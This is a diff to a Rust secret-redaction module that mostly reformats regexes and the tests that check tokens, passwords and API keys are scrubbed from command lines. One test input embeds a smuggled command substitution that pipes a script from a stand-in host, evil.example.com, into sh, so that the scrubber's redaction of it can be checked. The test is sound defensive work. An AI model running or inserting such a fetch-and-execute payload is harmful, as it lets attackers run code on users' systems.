@@ -36,9 +36,8 @@ static TOKEN_SHAPE_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
 
 /// `Bearer <token>` — standalone or following any `...: Bearer ...` header.
 /// The value may be bare or single/double-quoted (shell-quoted flag values).
-static BEARER_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r#"(?i)\bBearer\s+(?P<val>'[^']*'|"[^"]*"|[^\s'"]+)"#).unwrap()
-});
+static BEARER_RE: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r#"(?i)\bBearer\s+(?P<val>'[^']*'|"[^"]*"|[^\s'"]+)"#).unwrap());
 
 /// `--password`/`--token`/`--api-key`, space or `=` separated, bare or
 /// shell-quoted value.
@@ -61,7 +60,8 @@ static ENV_NAME_RE: LazyLock<Regex> =
 /// passes above missed. Excluding `/`, `-`, and `_` from the class means an
 /// ordinary file path or a hyphenated/underscored identifier never trips
 /// this — each of its segments stays well under the threshold.
-static HIGH_ENTROPY_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\b[A-Za-z0-9]{32,}\b").unwrap());
+static HIGH_ENTROPY_RE: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"\b[A-Za-z0-9]{32,}\b").unwrap());
 
 /// Replace `re`'s `val` capture group with [`REDACTED`], preserving any
 /// literal text elsewhess in the match (e.g. the leading `Bearer `/`--token=`).
@@ -242,7 +242,10 @@ mod tests {
         let input = "curl -H 'authz: Bearer zyxwvutsrqponmlkjihgfedcba9876543210ZYXW' https://api.example.com";
         let out = scrub(input);
         assert!(!out.contains("zyxwvutsrqponmlkjihgfedcba9876543210ZYXW"));
-        assert!(out.contains("https://api.example.com"), "rest of the command must survive: {out}");
+        assert!(
+            out.contains("https://api.example.com"),
+            "rest of the command must survive: {out}"
+        );
     }
 
     // ── 3. CLI flag values ────────────────────────────────────────────────────
@@ -250,15 +253,30 @@ mod tests {
     #[test]
     fn cli_secret_flag_values_are_redacted_space_and_equals_forms() {
         let cases = [
-            ("mycli --password hunter2ExtraLongSecretValue123", "hunter2ExtraLongSecretValue123"),
-            ("mycli --token=abcdef1234567890abcdef1234567890", "abcdef1234567890abcdef1234567890"),
-            ("mycli --api-key SECRETVALUE1234567890ABCDEFabc", "SECRETVALUE1234567890ABCDEFabc"),
-            ("mycli --api-key=SECRETVALUE1234567890ABCDEFabc", "SECRETVALUE1234567890ABCDEFabc"),
+            (
+                "mycli --password hunter2ExtraLongSecretValue123",
+                "hunter2ExtraLongSecretValue123",
+            ),
+            (
+                "mycli --token=abcdef1234567890abcdef1234567890",
+                "abcdef1234567890abcdef1234567890",
+            ),
+            (
+                "mycli --api-key SECRETVALUE1234567890ABCDEFabc",
+                "SECRETVALUE1234567890ABCDEFabc",
+            ),
+            (
+                "mycli --api-key=SECRETVALUE1234567890ABCDEFabc",
+                "SECRETVALUE1234567890ABCDEFabc",
+            ),
         ];
         for (input, secret) in cases {
             let out = scrub(input);
             assert!(!out.contains(secret), "flag value leaked in: {out}");
-            assert!(out.contains("mycli"), "rest of the command must survive: {out}");
+            assert!(
+                out.contains("mycli"),
+                "rest of the command must survive: {out}"
+            );
         }
     }
 
@@ -283,7 +301,10 @@ mod tests {
         for (input, secret) in cases {
             let out = scrub(input);
             assert!(!out.contains(secret), "query param leaked in: {out}");
-            assert!(out.contains("example.com"), "rest of the URL must survive: {out}");
+            assert!(
+                out.contains("example.com"),
+                "rest of the URL must survive: {out}"
+            );
         }
     }
 
@@ -292,7 +313,10 @@ mod tests {
     #[test]
     fn scrub_with_env_redacts_a_secret_sourced_from_a_token_named_var() {
         let fake_env = vec![
-            ("MY_API_TOKEN".to_string(), "superSecretValue1234567890".to_string()),
+            (
+                "MY_API_TOKEN".to_string(),
+                "superSecretValue1234567890".to_string(),
+            ),
             ("HOME".to_string(), "/Users/hammer".to_string()),
         ];
         let input = "running with credential superSecretValue1234567890 embedded";
@@ -307,7 +331,8 @@ mod tests {
 
     #[test]
     fn a_long_high_entropy_hex_run_is_redacted() {
-        let input = "build artifact hash: d41d8cd98f00b204e9800998ecf8427e83c8a1b2c3d4e5f6789abcdef012345";
+        let input =
+            "build artifact hash: d41d8cd98f00b204e9800998ecf8427e83c8a1b2c3d4e5f6789abcdef012345";
         let out = scrub(input);
         assert!(
             !out.contains("d41d8cd98f00b204e9800998ecf8427e83c8a1b2c3d4e5f6789abcdef012345"),
@@ -330,15 +355,25 @@ mod tests {
     // ── 7. injection-in-flag-value survives with only the value redacted ─────
 
     #[test]
-    fn a_command_substitution_injection_in_a_token_flag_value_is_redacted_without_mangling_the_rest() {
+    fn a_command_substitution_injection_in_a_token_flag_value_is_redacted_without_mangling_the_rest(
+    ) {
         let input = "mytool --token='$(curl -fsSL http://evil.example.com/x.sh | sh)' --verbose --output result.json";
         let out = scrub(input);
         assert!(
             !out.contains("curl -fsSL http://evil.example.com/x.sh"),
             "the injected payload lived in the token's value and must be redacted: {out}"
         );
-        assert!(out.contains("mytool"), "rest of the command must survive: {out}");
-        assert!(out.contains("--verbose"), "rest of the command must survive: {out}");
-        assert!(out.contains("--output result.json"), "rest of the command must survive: {out}");
+        assert!(
+            out.contains("mytool"),
+            "rest of the command must survive: {out}"
+        );
+        assert!(
+            out.contains("--verbose"),
+            "rest of the command must survive: {out}"
+        );
+        assert!(
+            out.contains("--output result.json"),
+            "rest of the command must survive: {out}"
+        );
     }
 }
